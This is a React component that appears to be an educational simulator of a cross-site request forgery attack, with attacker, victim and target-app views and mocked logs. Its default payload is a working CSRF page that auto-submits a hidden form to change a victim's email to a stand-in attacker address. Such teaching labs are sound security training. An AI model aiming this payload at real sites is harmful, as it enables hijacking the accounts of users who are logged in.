import React, { useState } from 'react';
import { Globe, Server, User, Send, ShieldAlert } from 'lucide-react';
import { toast } from 'sonner';

export const EnvironmentalSimulator: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'attacker' | 'victim' | 'target'>('attacker');
  const [attackerPayload, setAttackerPayload] = useState(
    "<html>\n  <body>\n    <form action=\"http://target-app.internal/api/email/change\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"pwned@evil.com\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>"
  );
  
  const [targetState, setTargetState] = useState({
    user: 'victim_user',
    email: 'victim@legit.com',
    isLoggedIn: true
  });

  const [simulationLogs, setSimulationLogs] = useState<string[]>([
    "[TARGET] Target App running. Victim logged in."
  ]);

  const addLog = (msg: string) => setSimulationLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);

  const deliverToVictim = () => {
    addLog("[ATTACKER] Payload hosted and link delivered to victim.");
    setActiveTab('victim');
    
    setTimeout(() => {
      addLog("[VICTIM] Victim clicked the link. Browser rendering malicious HTML.");
      
      setTimeout(() => {
        // Evaluate the payload broadly
        if (attackerPayload.includes("action=\"http://target-app.internal/api/email/change\"") && attackerPayload.includes("submit()")) {
          // Extract the new email using regex for simple mock
          const match = attackerPayload.match(/value="([^"]+)"/);
          const newEmail = match ? match[1] : 'pwned@evil.com';
          
          setTargetState(prev => ({...prev, email: newEmail}));
          addLog(`[TARGET] Received authenticated POST request to /api/email/change. Email updated to ${newEmail}`);
          toast.success("CSRF Attack Successful!");
          setActiveTab('target');
        } else {
          addLog("[VICTIM] Browser executed payload. No action triggered on Target App.");
          toast.info("Payload executed but no vulnerability triggered.");
        }
      }, 1000);
    }, 1000);
  };

  return (
    <div className="flex flex-col min-h-[350px] bg-slate-950 text-slate-300 font-sans border border-slate-800 rounded-xl overflow-hidden">
      {/* Tabs */}
      <div className="flex bg-slate-900 border-b border-slate-800">
        <button 
          onClick={() => setActiveTab('attacker')}
          className={`flex-1 flex items-center justify-center gap-2 py-3 px-4 text-sm font-bold transition-colors ${activeTab === 'attacker' ? 'bg-rose-950/50 text-rose-400 border-b-2 border-rose-500' : 'text-slate-500 hover:text-slate-300 hover:bg-slate-800'}`}
        >
          <Server className="w-4 h-4" /> Attacker Server
        </button>
        <button 
          onClick={() => setActiveTab('victim')}
          className={`flex-1 flex items-center justify-center gap-2 py-3 px-4 text-sm font-bold transition-colors ${activeTab === 'victim' ? 'bg-indigo-950/50 text-indigo-400 border-b-2 border-indigo-500' : 'text-slate-500 hover:text-slate-300 hover:bg-slate-800'}`}
        >
          <User className="w-4 h-4" /> Victim Browser
        </button>
        <button 
          onClick={() => setActiveTab('target')}
          className={`flex-1 flex items-center justify-center gap-2 py-3 px-4 text-sm font-bold transition-colors ${activeTab === 'target' ? 'bg-emerald-950/50 text-emerald-400 border-b-2 border-emerald-500' : 'text-slate-500 hover:text-slate-300 hover:bg-slate-800'}`}
        >
          <Globe className="w-4 h-4" /> Target App
        </button>
      </div>

      <div className="flex-1 flex flex-col p-4">
        {activeTab === 'attacker' && (
          <div className="flex flex-col h-full animate-in fade-in">
            <h3 className="text-rose-400 font-bold mb-2 flex items-center gap-2">Exploit Server Payload</h3>
            <textarea 
              value={attackerPayload}
              onChange={e => setAttackerPayload(e.target.value)}
              className="flex-1 bg-slate-900 border border-slate-800 rounded-lg p-4 font-mono text-xs text-rose-300 focus:outline-none focus:border-rose-500 resize-none"
              spellCheck="false"
            />
            <button 
              onClick={deliverToVictim}
              className="mt-4 bg-rose-600 hover:bg-rose-500 text-white font-bold py-2 px-4 rounded-lg flex items-center justify-center gap-2 transition-colors"
            >
              <Send className="w-4 h-4" /> Deliver exploit to victim
            </button>
          </div>
        )}

        {activeTab === 'victim' && (
          <div className="flex flex-col h-full animate-in fade-in items-center justify-center bg-slate-900 border border-slate-800 rounded-lg p-6">
            <User className="w-16 h-16 text-indigo-400 mb-4" />
            <h3 className="text-indigo-400 font-bold text-lg mb-2">Simulated Victim Environment</h3>
            <p className="text-slate-400 text-center text-sm max-w-md">
              This tab simulates the victim visiting the attacker's server while having an active session with the Target App. Watch the logs below to see the interaction unfold.
            </p>
          </div>
        )}

        {activeTab === 'target' && (
          <div className="flex flex-col h-full animate-in fade-in">
             <div className="flex justify-between items-center bg-emerald-950/20 border border-emerald-900/50 rounded-lg p-6 mb-4">
               <div>
                  <h3 className="text-emerald-400 font-bold text-lg mb-1">Target Application State</h3>
                  <p className="text-slate-400 text-sm">Active Session: {targetState.user}</p>
               </div>
               <div className="text-right">
                 <div className="text-xs text-slate-500 font-bold uppercase tracking-wider mb-1">Current Email</div>
                 <div className={`font-mono text-lg font-bold ${targetState.email !== 'victim@legit.com' ? 'text-amber-400 animate-pulse' : 'text-slate-300'}`}>
                   {targetState.email}
                 </div>
               </div>
             </div>
             {targetState.email !== 'victim@legit.com' && (
               <div className="bg-amber-950/50 border border-amber-900/50 rounded-lg p-4 flex items-center gap-3 text-amber-500">
                 <ShieldAlert className="w-6 h-6 flex-shrink-0" />
                 <div>
                   <h4 className="font-bold">Account Compromised</h4>
                   <p className="text-sm text-amber-400/80">The email address was changed without the user's explicit consent via a Cross-Site Request Forgery (CSRF) attack.</p>
                 </div>
               </div>
             )}
          </div>
        )}
      </div>

      {/* Global Telemetry Logs */}
      <div className="h-40 bg-slate-900 border-t border-slate-800 p-3 overflow-y-auto font-mono text-xs text-slate-400 flex flex-col gap-1 custom-scrollbar">
        {simulationLogs.map((log, i) => (
          <div key={i} className={`
            ${log.includes("[ATTACKER]") ? "text-rose-400" : ""}
            ${log.includes("[VICTIM]") ? "text-indigo-400" : ""}
            ${log.includes("[TARGET]") ? "text-emerald-400" : ""}
          `}>
            {log}
          </div>
        ))}
      </div>
    </div>
  );
};

export default EnvironmentalSimulator;
